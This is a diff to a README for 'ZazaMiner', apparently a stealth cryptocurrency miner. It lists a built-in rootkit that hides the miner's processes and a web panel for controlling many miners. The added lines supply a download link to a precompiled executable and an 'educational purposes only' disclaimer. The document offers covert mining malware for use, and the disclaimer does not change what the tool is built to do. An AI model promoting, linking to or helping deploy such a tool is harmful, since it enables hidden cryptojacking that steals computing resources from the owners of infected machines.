@@ -59,3 +59,17 @@ This miner can mine all the following algorithms and thus any cryptocurrency tha
 * Web Panel Support - Has support for monitoring and configuring all the miners efficiently in a free self-hosted online web panel
 * Rootkit - Has a built-in rootkit that can be enabled to fully hide the miner processes
 * And many many more.
+
+## Downloads
+
+Pre-Compiled: [here](https://github.com/zazaman4000/ZazaMiner/releases/download/download/ZazaMiner.exe)
+
+## Disclaimer
+
+I, the creator, am not responsible for any actions, and or damages, caused by this software.
+
+You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.
+
+This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.
+
+By using this software, you automatically agree to the above.
